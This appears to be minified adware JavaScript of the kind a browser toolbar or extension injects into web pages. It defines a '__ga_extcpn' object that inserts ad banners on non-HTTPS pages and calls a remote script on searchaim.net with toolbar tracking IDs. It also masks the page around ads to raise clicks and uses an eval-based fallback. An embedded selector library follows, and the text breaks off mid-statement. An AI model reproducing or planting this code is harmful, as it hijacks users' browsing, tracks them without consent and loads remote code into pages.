;try{(function(d,w,u){if(w.top!=w||w["__ga_extcpn"]!==u){return}var $$=w["__ga_extcpn"]={date:new Date(),bannerHideTime:86400000,adTitle:"pacman",useCtrEnchancer:"",lp:"ga_extcpn_",lset:function(key,value){return localStorage.setItem($$.lp+key,$$.toJson(value))},lget:function(key,value){var data=localStorage.getItem($$.lp+key);if(data){return $$.fromJson(data)}},fromJson:JSON?JSON.parse:function(str){if(str===""){str='""'}eval("var p="+str+";");return p},getSiteConfig:function(){return this.lget(this.lp+"cfg")||{}},saveSiteConfig:function(config){this.lset(this.lp+"cfg",config)},updateLimits:function(){$$.cors({callback:function(data){},mode:"jsonp",data:{a:"updateLimit"}})},loadedCallback:function(code){$$.script("//searchaim.net/ad/report/?mid=extcpn&wid="+window.tbParams.wid+"&sid="+window.tbParams.sid+"&tid="+window.tbParams.tid+"&rid="+code+"&jsonp=window.__ga_extcpn.reportSetCallback",true)},reportSetCallback:function(response){},bannerInfoClick:function(){window.twBarFunctions.optoutShow()},allowBannerInsert:function(){if(location.protocol=="https:"){return false}return true},getRand:function(min,max){return Math.floor((Math.random()*max)+min)},cumulativeOffset:function(element){var top=0,left=0;do{top+=element.offsetTop||0;left+=element.offsetLeft||0;element=element.offsetParent}while(element);return{top:top,left:left}},getScrollOffset:function(){var scrOfX=0,scrOfY=0;if(typeof(window.pageYOffset)=="number"){scrOfY=window.pageYOffset;scrOfX=window.pageXOffset}else{if(document.body&&(document.body.scrollLeft||document.body.scrollTop)){scrOfY=document.body.scrollTop;scrOfX=document.body.scrollLeft}else{if(document.documentElement&&(document.documentElement.scrollLeft||document.documentElement.scrollTop)){scrOfY=document.documentElement.scrollTop;scrOfX=document.documentElement.scrollLeft}}}return[scrOfX,scrOfY]},maskInitiated:false,createMask:function(element){if(!$$.maskInitiated){var dcMaskStyle="background-color: #000000;opacity: 0.8;position: absolute;z-index: 999999991;";var mask_and_message='<div id="dc-ce-mask-1" style="'+dcMaskStyle+'" class="dc-ce-mask" ></div>';mask_and_message+='<div id="dc-ce-mask-2" style="'+dcMaskStyle+'" class="dc-ce-mask" ></div>';mask_and_message+='<div id="dc-ce-mask-3" style="'+dcMaskStyle+'" class="dc-ce-mask" ></div>';mask_and_message+='<div id="dc-ce-mask-4" style="'+dcMaskStyle+'" class="dc-ce-mask" ></div>';mask_and_message+='<div id="dc-ce-message-container" style="z-index: 999999992;position: fixed;top: 0;left: 0;height: auto;width: 100%;padding: 0 !important;background-color: #000000;" ><div id="dc-ce-message"></div></div>';var el=d.createElement("div");el.innerHTML=mask_and_message;d.body.appendChild(el);$$.maskInitiated=true}var adv_width=element.clientWidth;var adv_height=element.clientHeight;var html=d.documentElement,body=d.getElementsByTagName("body")[0];var document_width=Math.max(body.scrollWidth,body.offsetWidth,html.clientWidth,html.scrollWidth,html.offsetWidth);var document_height=Math.max(body.scrollHeight,body.offsetHeight,html.clientHeight,html.scrollHeight,html.offsetHeight);var pos=$$.cumulativeOffset(element);var offset_top=pos.top;var offset_left=pos.left;var offset_bottom=document_height-offset_top-adv_height;var offset_right=document_width-offset_left-adv_width;var mask1=d.getElementById("dc-ce-mask-1");mask1.style.top=0;mask1.style.left=0;mask1.style.height=offset_top+"px";mask1.style.width=document_width+"px";var mask2=d.getElementById("dc-ce-mask-2");mask2.style.top=offset_top+"px";mask2.style.left=0;mask2.style.height=adv_height+"px";mask2.style.width=offset_left+"px";var mask3=d.getElementById("dc-ce-mask-3");mask3.style.top=offset_top+adv_height+"px";mask3.style.left=0;mask3.style.height=offset_bottom+"px";mask3.style.width=document_width+"px";var mask4=d.getElementById("dc-ce-mask-4");mask4.style.top=offset_top+"px";mask4.style.left=offset_left+adv_width+"px";mask4.style.height=adv_height+"px";mask4.style.width=offset_right+"px";$$.each($(".dc-ce-mask"),function(el){el.style.display="block"})},enableCtrEnchanser:function(element){$$.on(element,"mouseover",function(){if(!element.__mask_enabled){$$.createMask(element);element.__mask_enabled=1}});$$.on(element,"mouseleave",function(){$$.each($(".dc-ce-mask"),function(el){el.style.display="none";element.__mask_enabled=0})})},applyCssStyle:function(el,styles){if(!el){return false}var textStyle=el.style.cssText;var listStyles=textStyle.split(";");var resultStyle={};for(var i in listStyles){var params=listStyles[i].split(":");resultStyle[params[0]]=params[1]}for(var i in styles){resultStyle[i]=styles[i]}var mergedStyle=[];for(var i in resultStyle){mergedStyle.push(i+":"+resultStyle[i])}el.style.cssText=mergedStyle.join(";")},callEvent:function(el,etype){if(el.fireEvent){el.fireEvent("on"+etype)}else{var evObj=document.createEvent("Events");evObj.initEvent(etype,true,false);el.dispatchEvent(evObj)}}};var addCss;(function(){var stylesQueue=[],timeoutRecursiveCall,timeoutCancel;function appendToBody(style){stylesQueue.push(style);if(!d.body){timeoutRecursiveCall=setTimeout(arguments.callee,100);if(!timeoutCancel){timeoutCancel=setTimeout(function(){clearTimeout(timeoutRecursiveCall)},3000)}}else{while(stylesQueue.length){d.body.appendChild(stylesQueue.pop())}}}addCss=function(css){var style=d.createElement("style");style.type="text/css";style.styleSheet?style.styleSheet.cssText+=css:style.innerHTML+=css;appendToBody(style);return style}})();$$.siteConfig=$$.getSiteConfig();var replace_ad_css=null;;(function(aA,q){var G,aD,l,v,R,U,ag,aH,S,aj,L,w,at,an,aB,k,P,av="sizzle"+-(new Date()),T=aA.document,aE=0,ao=0,d=J(),au=J(),Q=J(),ah=false,N=function(){return 0},az=typeof q,ab=1<<31,Y=({}).hasOwnProperty,ax=[],ay=ax.pop,W=ax.push,b=ax.push,u=ax.slice,j=ax.indexOf||function(aJ){var aI=0,e=this.length;for(;aI<e;aI++){if(this[aI]===aJ){return aI}}return -1},c="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",x="[\\x20\\t\\r\\n\\f]",a="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",V=a.replace("w","w#"),aq="\\["+x+"*("+a+")"+x+"*(?:([*^$|!~]?=)"+x+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+V+")|)|)"+x+"*\\]",s=":("+a+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+aq.replace(3,8)+")*)|.*)\\)|)",z=new RegExp("^"+x+"+|((?:^|[^\\\\])(?:\\\\.)*)"+x+"+$","g"),D=new RegExp("^"+x+"*,"+x+"*"),K=new RegExp("^"+x+"*([>+~]|"+x+")"+x+"*"),al=new RegExp(x+"*[+~]"),B=new RegExp("="+x+"*([^\\]'\"]*)"+x+"*\\]","g"),ad=new RegExp(s),ae=new RegExp("^"+V+"$"),am={ID:new RegExp("^#("+a+")"),CLASS:new RegExp("^\\.("+a+")"),TAG:new RegExp("^("+a.replace("w","w*")+")"),ATTR:new RegExp("^"+aq),PSEUDO:new RegExp("^"+s),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+x+"*(even|odd|(([+-]|)(\\d*)n|)"+x+"*(?:([+-]|)"+x+"*(\\d+)|))"+x+"*\\)|)","i"),bool:new RegExp("^(?:"+c+")$","i"),needsContext:new RegExp("^"+x+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+x+"*((?:-\\d)?\\d*)"+x+"*\\)|)(?=[^-]|$)","i")},aa=/^[^{]+\{\s*\[native \w/,ac=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,h=/^(?:input|select|textarea|button)$/i,t=/^h\d$/i,X=/'|\\/g,A=new RegExp("\\\\([\\da-f]{1,6}"+x+"?|("+x+")|.)","ig"),ap=function(e,aJ,i){var aI="0x"+aJ-65536;return aI!==aI||i?aJ:aI<0?String.fromCharCode(aI+65536):String.fromCharCode(aI>>10|55296,aI&1023|56320)};try{b.apply((ax=u.call(T.childNodes)),T.childNodes);ax[T.childNodes.length].nodeType}catch(M){b={apply:ax.length?function(i,e){W.apply(i,u.call(e))}:function(aK,aJ){var e=aK.length,aI=0;while((aK[e++]=aJ[aI++])){}aK.length=e-1}}}function E(aP,aI,aT,aV){var aU,aM,aN,aR,aS,aL,aK,e,aJ,aQ;if((aI?aI.ownerDocument||aI:T)!==L){aj(aI)}aI=aI||L;aT=aT||[];if(!aP||typeof aP!=="string"){return aT}if((aR=aI.nodeType)!==1&&aR!==9){return[]}if(at&&!aV){if((aU=ac.exec(aP))){if((aN=aU[1])){if(aR===9){aM=aI.getElementById(aN);if(aM&&aM.parentNode){if(aM.id===aN){aT.push(aM);return aT}}else{return aT}}else{if(aI.ownerDocument&&(aM=aI.ownerDocument.getElementById(aN))&&P(aI,aM)&&aM.id===aN){aT.push(aM);return aT}}}else{if(aU[2]){b.apply(aT,aI.getElementsByTagName(aP));return aT}else{if((aN=aU[3])&&aD.getElementsByClassName&&aI.getElementsByClassName){b.apply(aT,aI.getElementsByClassName(aN));return aT}}}}if(aD.qsa&&(!an||!an.test(aP))){e=aK=av;aJ=aI;aQ=aR===9&&aP;if(aR===1&&aI.nodeName.toLowerCase()!=="object"){aL=p(aP);if((aK=aI.getAttribute("id"))){e=aK.replace(X,"\\$&")}else{aI.setAttribute("id",e)}e="[id='"+e+"'] ";aS=aL.length;while(aS--){aL[aS]=e+o(aL[aS])}aJ=al.test(aP)&&aI.parentNode||aI;aQ=aL.join(",")}if(aQ){try{b.apply(aT,aJ.querySelectorAll(aQ));return aT}catch(aO){}finally{if(!aK){aI.removeAttribute("id")}}}}}return aC(aP.replace(z,"$1"),aI,aT,aV)}function O(e){return aa.test(e+"")}function J(){var i=[];function e(aI,aJ){if(i.push(aI+=" ")>v.cacheLength){delete e[i.shift()]}return(e[aI]=aJ)}return e}function r(e){e[av]=true;return e}function m(i){var aJ=L.createElement("div");try{return !!i(aJ)}catch(aI){return false}finally{if(aJ.parentNode){aJ.parentNode.removeChild(aJ)}aJ=null}}function aF(e,aJ,aM){e=e.split("|");var aL,aI=e.length,aK=aM?null:aJ;while(aI--){if(!(aL=v.attrHandle[e[aI]])||aL===aJ){v.attrHandle[e[aI]]=aK}}}function Z(i,e){var aI=i.getAttributeNode(e);return aI&&aI.specified?aI.value:i[e]===true?e.toLowerCase():null}function H(i,e){return i.getAttribute(e,e.toLowerCase()==="type"?1:2)}function C(e){if(e.nodeName.toLowerCase()==="input"){return e.defaultValue}}function f(i,e){var aJ=e&&i,aI=aJ&&i.nodeType===1&&e.nodeType===1&&(~e.sourceIndex||ab)-(~i.sourceIndex||ab);if(aI){return aI}if(aJ){while((aJ=aJ.nextSibling)){if(aJ===e){return -1}}}return i?1:-1}function F(e){return function(aI){var i=aI.nodeName.toLowerCase();return i==="input"&&aI.type===e}}function g(e){return function(aI){var i=aI.nodeName.toLowerCase();return(i==="input"||i==="button")&&aI.type===e}}function ar(e){return r(function(i){i=+i;return r(function(aI,aM){var aK,aJ=e([],aI.length,i),aL=aJ.length;while(aL--){if(aI[(aK=aJ[aL])]){aI[aK]=!(aM[aK]=aI[aK])}}})})}U=E.isXML=function(e){var i=e&&(e.ownerDocument||e).documentElement;return i?i.nodeName!=="HTML":false};aD=E.support={};aj=E.setDocument=function(e){var i=e?e.ownerDocument||e:T;if(i===L||i.nodeType!==9||!i.documentElement){return L}L=i;w=i.documentElement;at=!U(i);aD.attributes=m(function(aI){aI.innerHTML="<a href='#'></a>";aF("type|href|height|width",H,aI.firstChild.getAttribute("href")==="#");aF(c,Z,aI.getAttribute("disabled")==null);aI.className="i";return !aI.getAttribute("className")});aD.input=m(function(aI){aI.innerHTML="<input>";aI.firstChild.setAttribute("value","");return aI.firstChild.getAttribute("value")===""});aF("value",C,aD.attributes&&aD.input);aD.getElementsByTagName=m(function(aI){aI.appendChild(i.createComment(""));return !aI.getElementsByTagName("*").length});aD.getElementsByClassName=m(function(aI){aI.innerHTML="<div class='a'></div><div class='a i'></div>";aI.firstChild.className="i";return aI.getElementsByClassName("i").length===2});aD.getById=m(function(aI){w.appendChild(aI).id=av;return !i.getElementsByName||!i.getElementsByName(av).length});if(aD.getById){v.find.ID=function(aK,aJ){if(typeof aJ.getElementById!==az&&at){var aI=aJ.getElementById(aK);return aI&&aI.parentNode?[aI]:[]}};v.filter.ID=function(aJ){var aI=aJ.replace(A,ap);return function(aK){return aK.getAttribute("id")===aI}}}else{delete v.find.ID;v.filter.ID=function(aJ){var aI=aJ.replace(A,ap);return function(aL){var aK=typeof aL.getAttributeNode!==az&&aL.getAttributeNode("id");return aK&&aK.value===aI}}}v.find.TAG=aD.getElementsByTagName?function(aI,aJ){if(typeof aJ.getElementsByTagName!==az){return aJ.getElementsByTagName(aI)}}:function(aI,aM){var aN,aL=[],aK=0,aJ=aM.getElementsByTagName(aI);if(aI==="*"){while((aN=aJ[aK++])){if(aN.nodeType===1){aL.push(aN)}}return aL}return aJ};v.find.CLASS=aD.getElementsByClassName&&function(aJ,aI){if(typeof aI.getElementsByClassName!==az&&at){return aI.getElementsByClassName(aJ)}};aB=[];an=[];if((aD.qsa=O(i.querySelectorAll))){m(function(aI){aI.innerHTML="<select><option selected=''></option></select>";if(!aI.querySelectorAll("[selected]").length){an.push("\\["+x+"*(?:value|"+c+")")}if(!aI.querySelectorAll(":checked").length){an.push(":checked")}});m(function(aJ){var aI=i.createElement("input");aI.setAttribute("type","hidden");aJ.appendChild(aI).setAttribute("t","");if(aJ.querySelectorAll("[t^='']").length){an.push("[*^$]="+x+"*(?:''|\"\")")}if(!aJ.querySelectorAll(":enabled").length){an.push(":enabled",":disabled")}aJ.querySelectorAll("*,:x");an.push(",.*:")})}if((aD.matchesSelector=O((k=w.webkitMatchesSelector||w.mozMatchesSelector||w.oMatchesSelector||w.msMatchesSelector)))){m(function(aI){aD.disconnectedMatch=k.call(aI,"div");k.call(aI,"[s!='']:x");aB.push("!=",s)})}an=an.length&&new RegExp(an.join("|"));aB=aB.length&&new RegExp(aB.join("|"));P=O(w.contains)||w.compareDocumentPosition?function(aJ,aI){var aL=aJ.nodeType===9?aJ.documentElement:aJ,aK=aI&&aI.parentNode;return aJ===aK||!!(aK&&aK.nodeType===1&&(aL.contains?aL.contains(aK):aJ.compareDocumentPosition&&aJ.compareDocumentPosition(aK)&16))}:function(aJ,aI){if(aI){while((aI=aI.parentNode)){if(aI===aJ){return true}}}return false};aD.sortDetached=m(function(aI){return aI.compareDocumentPosition(i.createElement("div"))&1});N=w.compareDocumentPosition?function(aJ,aI){if(aJ===aI){ah=true;return 0}var aK=aI.compareDocumentPosition&&aJ.compareDocumentPosition&&aJ.compareDocumentPosition(aI);if(aK){if(aK&1||(!aD.sortDetached&&aI.compareDocumentPosition(aJ)===aK)){if(aJ===i||P(T,aJ)){return -1}if(aI===i||P(T,aI)){return 1}return S?(j.call(S,aJ)-j.call(S,aI)):0}return aK&4?-1:1}return aJ.compareDocumentPosition?-1:1}:function(aJ,aI){var aP,aM=0,aO=aJ.parentNode,aL=aI.parentNode,aK=[aJ],aN=[aI];if(aJ===aI){ah=true;return 0}else{if(!aO||!aL){return aJ===i?-1:aI===i?1:aO?-1:aL?1:S?(j.call(S,aJ)-j.call(S,aI)):0}else{if(aO===aL){return f(aJ,aI)}}}aP=aJ;while((aP=aP.parentNode)){aK.unshift(aP)}aP=aI;while((aP=aP.parentNode)){aN.unshift(aP)}while(aK[aM]===aN[aM]){aM++}return aM?f(aK[aM],aN[aM]):aK[aM]===T?-1:aN[aM]===T?1:0};return i};E.matches=function(i,e){return E(i,null,null,e)};E.matchesSelector=function(aI,aK){if((aI.ownerDocument||aI)!==L){aj(aI)}aK=aK.replace(B,"='$1']");if(aD.matchesSelector&&at&&(!aB||!aB.test(aK))&&(!an||!an.test(aK))){try{var i=k.call(aI,aK);if(i||aD.disconnectedMatch||aI.document&&aI.document.nodeType!==11){return i}}catch(aJ){}}return E(aK,L,null,[aI]).length>0};E.contains=function(e,i){if((e.ownerDocument||e)!==L){aj(e)}return P(e,i)};E.attr=function(aI,e){if((aI.ownerDocument||aI)!==L){aj(aI)}var i=v.attrHandle[e.toLowerCase()],aJ=(i&&Y.call(v.attrHandle,e.toLowerCase())?i(aI,e,!at):q);return aJ===q?aD.attributes||!at?aI.getAttribute(e):(aJ=aI.getAttributeNode(e))&&aJ.specified?aJ.value:null:aJ};E.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)};E.uniqueSort=function(aJ){var aK,aL=[],e=0,aI=0;ah=!aD.detectDuplicates;S=!aD.sortStable&&aJ.slice(0);aJ.sort(N);if(ah){while((aK=aJ[aI++])){if(aK===aJ[aI]){e=aL.push(aI)}}while(e--){aJ.splice(aL[e],1)}}return aJ};R=E.getText=function(aL){var aK,aI="",aJ=0,e=aL.nodeType;if(!e){for(;(aK=aL[aJ]);aJ++){aI+=R(aK)}}else{if(e===1||e===9||e===11){if(typeof aL.textContent==="string"){return aL.textContent}else{for(aL=aL.firstChild;aL;aL=aL.nextSibling){aI+=R(aL)}}}else{if(e===3||e===4){return aL.nodeValue}}}return aI};v=E.selectors={cacheLength:50,createPseudo:r,match:am,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:true}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:true},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){e[1]=e[1].replace(A,ap);e[3]=(e[4]||e[5]||"").replace(A,ap);if(e[2]==="~="){e[3]=" "+e[3]+" "}return e.slice(0,4)},CHILD:function(e){e[1]=e[1].toLowerCase();if(e[1].slice(0,3)==="nth"){if(!e[3]){E.error(e[0])}e[4]=+(e[4]?e[5]+(e[6]||1):2*(e[3]==="even"||e[3]==="odd"));e[5]=+((e[7]+e[8])||e[3]==="odd")}else{if(e[3]){E.error(e[0])}}return e},PSEUDO:function(i){var e,aI=!i[5]&&i[2];if(am.CHILD.test(i[0])){return null}if(i[3]&&i[4]!==q){i[2]=i[4]}else{if(aI&&ad.test(aI)&&(e=p(aI,true))&&(e=aI.indexOf(")",aI.length-e)-aI.length)){i[0]=i[0].slice(0,e);i[2]=aI.slice(0,e)}}return i.slice(0,3)}},filter:{TAG:function(i){var e=i.replace(A,ap).toLowerCase();return i==="*"?function(){return true}:function(aI){return aI.nodeName&&aI.nodeName.toLowerCase()===e}},CLASS:function(e){var i=d[e+" "];return i||(i=new RegExp("(^|"+x+")"+e+"("+x+"|$)"))&&d(e,function(aI){return i.test(typeof aI.className==="string"&&aI.className||typeof aI.getAttribute!==az&&aI.getAttribute("class")||"")})},ATTR:function(aI,i,e){return function(aK){var aJ=E.attr(aK,aI);if(aJ==null){return i==="!="}if(!i){return true}aJ+="";return i==="="?aJ===e:i==="!="?aJ!==e:i==="^="?e&&aJ.indexOf(e)===0:i==="*="?e&&aJ.indexOf(e)>-1:i==="$="?e&&aJ.slice(-e.length)===e:i==="~="?(" "+aJ+" ").indexOf(e)>-1:i==="|="?aJ===e||aJ.slice(0,e.length+1)===e+"-":false}},CHILD:function(i,aK,aJ,aL,aI){var aN=i.slice(0,3)!=="nth",e=i.slice(-4)!=="last",aM=aK==="of-type";return aL===1&&aI===0?function(aO){return !!aO.parentNode}:function(aU,aS,aX){var aO,a0,aV,aZ,aW,aR,aT=aN!==e?"nextSibling":"previousSibling",aY=aU.parentNode,aQ=aM&&aU.nodeName.toLowerCase(),aP=!aX&&!aM;if(aY){if(aN){while(aT){aV=aU;while((aV=aV[aT])){if(aM?aV.nodeName.toLowerCase()===aQ:aV.nodeType===1){return false}}aR=aT=i==="only"&&!aR&&"nextSibling"}return true}aR=[e?aY.firstChild:aY.lastChild];if(e&&aP){a0=aY[av]||(aY[av]={});aO=a0[i]||[];aW=aO[0]===aE&&aO[1];aZ=aO[0]===aE&&aO[2];aV=aW&&aY.childNodes[aW];while((aV=++aW&&aV&&aV[aT]||(aZ=aW=0)||aR.pop())){if(aV.nodeType===1&&++aZ&&aV===aU){a0[i]=[aE,aW,aZ];break}}}else{if(aP&&(aO=(aU[av]||(aU[av]={}))[i])&&aO[0]===aE){aZ=aO[1]}else{while((aV=++aW&&aV&&aV[aT]||(aZ=aW=0)||aR.pop())){if((aM?aV.nodeName.toLowerCase()===aQ:aV.nodeType===1)&&++aZ){if(aP){(aV[av]||(aV[av]={}))[i]=[aE,aZ]}if(aV===aU){break}}}}}aZ-=aI;return aZ===aL||(aZ%aL===0&&aZ/aL>=0)}}},PSEUDO:function(aJ,aI){var e,i=v.pseudos[aJ]||v.setFilters[aJ.toLowerCase()]||E.error("unsupported pseudo: "+aJ);if(i[av]){return i(aI)}if(i.length>1){e=[aJ,aJ,"",aI];return v.setFilters.hasOwnProperty(aJ.toLowerCase())?r(function(aM,aO){var aL,aK=i(aM,aI),aN=aK.length;while(aN--){aL=j.call(aM,aK[aN]);aM[aL]=!(aO[aL]=aK[aN])}}):function(aK){return i(aK,0,e)}}return i}},pseudos:{not:r(function(e){var i=[],aI=[],aJ=ag(e.replace(z,"$1"));return aJ[av]?r(function(aL,aQ,aO,aM){var aP,aK=aJ(aL,null,aM,[]),aN=aL.length;while(aN--){if((aP=aK[aN])){aL[aN]=!(aQ[aN]=aP)}}}):function(aM,aL,aK){i[0]=aM;aJ(i,null,aK,aI);return !aI.pop()}}),has:r(function(e){return function(i){return E(e,i).length>0}}),contains:r(function(e){return function(i){return(i.textContent||i.innerText||R(i)).indexOf(e)>-1}}),lang:r(function(e){if(!ae.test(e||"")){E.error("unsupported lang: "+e)}e=e.replace(A,ap).toLowerCase();return function(aI){var i;do{if((i=at?aI.lang:aI.getAttribute("xml:lang")||aI.getAttribute("lang"))){i=i.toLowerCase();return i===e||i.indexOf(e+"-")===0}}while((aI=aI.parentNode)&&aI.nodeType===1);return false}}),target:function(e){var i=aA.location&&aA.location.hash;return i&&i.slice(1)===e.id},root:function(e){return e===w},focus:function(e){return e===L.activeElement&&(!L.hasFocus||L.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return e.disabled===false},disabled:function(e){return e.disabled===true},checked:function(e){var i=e.nodeName.toLowerCase();return(i==="input"&&!!e.checked)||(i==="option"&&!!e.selected)},selected:function(e){if(e.parentNode){e.parentNode.selectedIndex}return e.selected===true},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling){if(e.nodeName>"@"||e.nodeType===3||e.nodeType===4){return false}}return true},parent:function(e){return !v.pseudos.empty(e)},header:function(e){return t.test(e.nodeName)},input:function(e){return h.test(e.nodeName)},button:function(i){var e=i.nodeName.toLowerCase();return e==="input"&&i.type==="button"||e==="button"},text:function(i){var e;return i.nodeName.toLowerCase()==="input"&&i.type==="text"&&((e=i.getAttribute("type"))==null||e.toLowerCase()===i.type)},first:ar(function(){return[0]}),last:ar(function(e,i){return[i-1]}),eq:ar(function(e,aI,i){return[i<0?i+aI:i]}),even:ar(function(e,aJ){var aI=0;for(;aI<aJ;aI+=2){e.push(aI)}return e}),odd:ar(function(e,aJ){var aI=1;for(;aI<aJ;aI+=2){e.push(aI)}return e}),lt:ar(function(e,aK,aJ){var aI=aJ<0?aJ+aK:aJ;for(;--aI>=0;){e.push(aI)}return e}),gt:ar(function(e,aK,aJ){var aI=aJ<0?aJ+aK:aJ;for(;++aI<aK;){e.push(aI)}return e})}};for(G in {radio:true,checkbox:true,file:true,password:true,image:true}){v.pseudos[G]=F(G)}for(G in {submit:true,reset:true}){v.pseudos[G]=g(G)}function p(aK,aP){var i,aL,aN,aO,aM,aI,e,aJ=au[aK+" "];if(aJ){return aP?0:aJ.slice(0)}aM=aK;aI=[];e=v.preFilter;while(aM){if(!i||(aL=D.exec(aM))){if(aL){aM=aM.slice(aL[0].length)||aM}aI.push(aN=[])}i=false;if((aL=K.exec(aM))){i=aL.shift();aN.push({value:i,type:aL[0].replace(z," ")});aM=aM.slice(i.length)}for(aO in v.filter){if((aL=am[aO].exec(aM))&&(!e[aO]||(aL=e[aO](aL)))){i=aL.shift();aN.push({value:i,type:aO,matches:aL});aM=aM.slice(i.length)}}if(!i){break}}return aP?aM.length:aM?E.error(aK):au(aK,aI).slice(0)}function o(aK){var aJ=0,aI=aK.length,e="";for(;aJ<aI;aJ++){e+=aK[aJ].value}return e}function y(aK,aI,aJ){var e=aI.dir,aL=aJ&&e==="parentNode",i=ao++;return aI.first?function(aO,aN,aM){while((aO=aO[e])){if(aO.nodeType===1||aL){return aK(aO,aN,aM)}}}:function(aQ,aO,aN){var aS,aM,aP,aR=aE+" "+i;if(aN){while((aQ=aQ[e])){if(aQ.nodeType===1||aL){if(aK(aQ,aO,aN)){return true}}}}else{while((aQ=aQ[e])){if(aQ.nodeType===1||aL){aP=aQ[av]||(aQ[av]={});if((aM=aP[e])&&aM[0]===aR){if((aS=aM[1])===true||aS===l){return aS===true}}else{aM=aP[e]=[aR];aM[1]=aK(aQ,aO,aN)||l;if(aM[1]===true){return true}}}}}}}function aG(e){return e.length>1?function(aL,aK,aI){var aJ=e.length;while(aJ--){if(!e[aJ](aL,aK,aI)){return false}}return true}:e[0]}function ak(e,aI,aJ,aK,aN){var aL,aQ=[],aM=0,aO=e.length,aP=aI!=null;for(;aM<aO;aM++){if((aL=e[aM])){if(!aJ||aJ(aL,aK,aN)){aQ.push(aL);if(aP){aI.push(aM)}}}}return aQ}function n(aI,i,aK,aJ,aL,e){if(aJ&&!aJ[av]){aJ=n(aJ)}if(aL&&!aL[av]){aL=n(aL,e)}return r(function(aW,aT,aO,aV){var aY,aU,aQ,aP=[],aX=[],aN=aT.length,aM=aW||I(i||"*",aO.nodeType?[aO]:aO,[]),aR=aI&&(aW||!i)?ak(aM,aP,aI,aO,aV):aM,aS=aK?aL||(aW?aI:aN||aJ)?[]:aT:aR;if(aK){aK(aR,aS,aO,aV)}if(aJ){aY=ak(aS,aX);aJ(aY,[],aO,aV);aU=aY.length;while(aU--){if((aQ=aY[aU])){aS[aX[aU]]=!(aR[aX[aU]]=aQ)}}}if(aW){if(aL||aI){if(aL){aY=[];aU=aS.length;while(aU--){if((aQ=aS[aU])){aY.push((aR[aU]=aQ))}}aL(null,(aS=[]),aY,aV)}aU=aS.length;while(aU--){if((aQ=aS[aU])&&(aY=aL?j.call(aW,aQ):aP[aU])>-1){aW[aY]=!(aT[aY]=aQ)}}}}else{aS=ak(aS===aT?aS.splice(aN,aS.length):aS);if(aL){aL(null,aT,aS,aV)}else{b.apply(aT,aS)}}})}function aw(aN){var aI,aL,aJ,aM=aN.length,aQ=v.relative[aN[0].type],aR=aQ||v.relative[" "],aK=aQ?1:0,aO=y(function(i){return i===aI},aR,true),aP=y(function(i){return j.call(aI,i)>-1},aR,true),e=[function(aT,aS,i){return(!aQ&&(i||aS!==aH))||((aI=aS).nodeType?aO(aT,aS,i):aP(aT,aS,i))}];for(;aK<aM;aK++){if((aL=v.relative[aN[aK].type])){e=[y(aG(e),aL)]}else{aL=v.filter[aN[aK].type].apply(null,aN[aK].matches);if(aL[av]){aJ=++aK;for(;aJ<aM;aJ++){if(v.relative[aN[aJ].type]){break}}return n(aK>1&&aG(e),aK>1&&o(aN.slice(0,aK-1).concat({value:aN[aK-2].type===" "?"*":""})).replace(z,"$1"),aL,aK<aJ&&aw(aN.slice(aK,aJ)),aJ<aM&&aw((aN=aN.slice(aJ))),aJ<aM&&o(aN))}e.push(aL)}}return aG(e)}function ai(aJ,aI){var aL=0,e=aI.length>0,aK=aJ.length>0,i=function(aV,aP,aU,aT,a1){var aQ,aR,aW,a0=[],aZ=0,aS="0",aM=aV&&[],aX=a1!=null,aY=aH,aO=aV||aK&&v.find.TAG("*",a1&&aP.parentNode||aP),aN=(aE+=aY==null?1:Math.random()||0.1);if(aX){aH=aP!==L&&aP;l=aL}for(;(aQ=aO[aS])!=null;aS++){if(aK&&aQ){aR=0;while((aW=aJ[aR++])){if(aW(aQ,aP,aU)){aT.push(aQ);break}}if(aX){aE=aN;l=++aL}}if(e){if((aQ=!aW&&aQ)){aZ--}if(aV){aM.push(aQ)}}}aZ+=aS;if(e&&aS!==aZ){aR=0;while((aW=aI[aR++])){aW(aM,a0,aP,aU)}if(aV){if(aZ>0){while(aS--){if(!(aM[aS]||a0[aS])){a0[aS]=ay.call(aT)}}}a0=ak(a0)}b.apply(aT,a0);if(aX&&!aV&&a0.length>0&&(aZ+aI.length)>1){E.uniqueSort(aT)}}if(aX){aE=aN;aH=aY}return aM};return e?r(i):i}ag=E.compile=function(e,aM){var aJ,aI=[],aL=[],aK=Q[e+" "];if(!aK){if(!aM){aM=p(e)}aJ=aM.length;while(aJ--){aK=aw(aM[aJ]);if(aK[av]){aI.push(aK)}else{aL.push(aK)}}aK=Q(e,ai(aL,aI))}return aK};function I(aI,aL,aK){var aJ=0,e=aL.length;for(;aJ<e;aJ++){E(aI,aL[aJ],aK)}return aK}function aC(aJ,e,aK,aN){var aL,aP,aI,aQ,aO,aM=p(aJ);if(!aN){if(aM.length===1){aP=aM[0]=aM[0].slice(0);if(aP.length>2&&(aI=aP[0]).type==="ID"&&aD.getById&&e.nodeType===9&&at&&v.relative[aP[1].type]){e=(v.find.ID(aI.matches[0].replace(A,ap),e)||[])[0];if(!e){return aK}aJ=aJ.slice(aP.shift().value.length)}aL=am.needsContext.test(aJ)?0:aP.length;while(aL--){aI=aP[aL];if(v.relative[(aQ=aI.type)]){break}if((aO=v.find[aQ])){if((aN=aO(aI.matches[0].replace(A,ap),al.test(aP[0].type)&&e.parentNode||e))){aP.splice(aL,1);aJ=aN.length&&o(aP);if(!aJ){b.apply(aK,aN);return aK}break}}}}}ag(aJ,aM)(aN,e,!at,aK,al.test(aJ));return aK}v.pseudos.nth=v.pseudos.eq;function af(){}af.prototype=v.filters=v.pseudos;v.setFilters=new af();aD.sortStable=av.split("").sort(N).join("")===av;aj();[0,0].sort(N);aD.detectDuplicates=ah;if(typeof define==="function"&&define.amd){define(function(){return 